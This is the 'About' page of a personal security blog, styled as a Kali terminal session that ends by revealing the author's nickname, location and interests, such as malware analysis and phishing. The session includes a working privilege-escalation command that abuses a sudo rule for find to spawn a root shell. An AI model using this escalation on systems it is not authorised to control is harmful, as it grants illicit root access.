+++
title = 'About'
layout = 'about'
url = '/about/'
summary = 'about'
+++

<p align="center"> <img src="/img/Untitled-design-unscreen.gif"> </p>

### connar@localhost:~$ whoami


```sh
unknown@kali:~$ whoami
unknown

unknown@kali:~$ ls -l /home/unknown/identity.json
-rw------- 1 root root 123 Oct 15 10:45 /home/unknown/identity.json

unknown@kali:~$ cat /home/unknown/identity.json
cat: /home/unknown/identity.json: Permission denied

unknown@kali:~$ sudo -l
[sudo] password for unknown: *************
Matching Defaults entries for unknown on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User unknown may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find

unknown@kali:~$ sudo find / -name identity.json -exec /bin/sh \; -quit

unknown@kali:~# whoami
root

unknown@kali:~# cat /home/unknown/identity.json
{
    "Nickname": "Connar",
    "Location": "Currently in NL",
    "Interests": [
        "Forensics",
        "Malware Analysis",
        "Maldev",
        "Social Engineering (phishing techniques)",
        "Reverse Engineering",
        "doxing techniques (I mean OSINT)"
    ],
    "Age": "24"
}

```